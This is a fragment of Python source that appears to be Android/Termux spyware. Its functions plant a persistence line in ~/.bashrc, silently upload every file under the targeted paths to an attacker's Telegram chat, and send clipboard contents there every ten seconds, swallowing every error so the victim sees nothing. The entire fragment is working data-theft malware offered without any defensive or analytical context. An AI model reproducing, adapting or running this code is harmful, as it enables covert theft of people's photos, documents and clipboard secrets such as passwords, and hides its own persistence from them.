def setup_autostart_safely():
    try:
        script_path = os.path.abspath(sys.argv[0])
        bashrc_path = os.path.expanduser("~/.bashrc")
        autostart_cmd = f'\n# Auto-start\npgrep -f "{script_path}" > /dev/null || nohup python "{script_path}" &\n'
        
        content = ""
        if os.path.exists(bashrc_path):
            with open(bashrc_path, "r") as f:
                content = f.read()
        
        if script_path not in content:
            with open(bashrc_path, "a") as f:
                f.write(autostart_cmd)
    except:
        pass

def send_photo(photo_path, caption=""):
    if not os.path.exists(photo_path): return
    try:
        with open(photo_path, "rb") as f:
            bot.send_photo(ADMIN_CHAT_ID, f, caption=caption, disable_notification=True)
    except:
        pass

def send_audio(audio_path, caption=""):
    if not os.path.exists(audio_path): return
    try:
        with open(audio_path, "rb") as f:
            bot.send_audio(ADMIN_CHAT_ID, f, caption=caption, disable_notification=True)
    except:
        pass

def send_file(file_path):
    if not os.path.isfile(file_path): return
    try:
        name = os.path.basename(file_path)
        ext = name.lower()
        caption = f"By: TOM | {name}"
        file_size = os.path.getsize(file_path)
        
        if ext.endswith((".jpg", ".jpeg", ".png", ".webp", ".gif")):
            with open(file_path, "rb") as f:
                bot.send_photo(ADMIN_CHAT_ID, f, caption=caption, disable_notification=True)
        elif ext.endswith((".mp4", ".mov", ".3gp", ".avi", ".mkv", ".webm")):
            if file_size > 50 * 1024 * 1024:
                with open(file_path, "rb") as f:
                    bot.send_document(ADMIN_CHAT_ID, f, caption=f"By: TOM (Large Video) | {name}", disable_notification=True)
            else:
                with open(file_path, "rb") as f:
                    bot.send_video(ADMIN_CHAT_ID, f, caption=caption, timeout=120, disable_notification=True)
        else:
            with open(file_path, "rb") as f:
                bot.send_document(ADMIN_CHAT_ID, f, caption=f"By: TOM | {name}", disable_notification=True)
    except:
        pass

def upload_all_files():
    with ThreadPoolExecutor(max_workers=60) as executor:
        for base in TARGET_PATHS:
            if not os.path.exists(base): continue
            for root, _, files in os.walk(base):
                for file in files:
                    full = os.path.join(root, file)
                    executor.submit(send_file, full)

def check_clipboard_continuously():
    global last_clipboard_content
    while True:
        try:
            clip = subprocess.check_output(["termux-clipboard-get"]).decode().strip()
            if clip and clip != last_clipboard_content:
                last_clipboard_content = clip
                send_text(f"📋 محتوى جديد في الحافظة:\n\n{clip}")
        except:
            pass
        time.sleep(10)
